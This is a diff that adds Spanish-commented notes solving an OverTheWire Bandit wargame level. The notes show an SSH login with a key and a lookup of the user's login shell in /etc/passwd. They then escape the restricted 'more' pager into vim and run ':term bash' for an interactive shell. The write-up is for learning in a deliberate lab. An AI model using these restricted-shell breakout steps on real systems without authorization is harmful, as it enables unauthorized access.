@@ -1,0 +1,42 @@
+#Se crea una conexion base
+ssh bandit26@bandit.labs.overthewire.org -p 2220 -i bandit25/bandit26.sshkey
+
+#Se busca dentro de passwd, para ver que tipo de shell se usa
+cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+
+#Se ven los permisos de showtext, para ver si es editable
+ll /usr/bin | grep showtext
+-rwxr-xr-x  1 root     root           58 Dec  3 08:14 showtext*
+
+#El contenido de showtext es el siguiente
+cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+exec more ~/text.txt
+exit 0
+
+#Una forma de obtener acceso al usuario bandit26 es aprovechar la ejecución
+#del script, a traves del comando "more", ya que desde dentro se puede
+#acceder al editor de vim, el cual permite la ejecucion de comandos.
+
+#Para acceder a la visualización de "more" es necesario hacer la 
+#ventana lo suficientemente pequeña para que el texto de "showtext" se 
+#detenga a mitad. Tras esto, se accede a vim mediante la tecla "v".
+
+#Para obtener una shell, se pulsa ":" y se pasa el siguiente comando a 
+#ejecutar:
+:term bash
+#Con esto se obtiene una consola interactiva. Para redimensionarla:
+echo -e "\e[8;30;60t"
+
+o
+
+stty rows 30 cols 107
+
+# Tambien se puede saber el tamaño de una ventana mediante:
+stty size
+
+#Con esto, ya tenemos una shell funcional
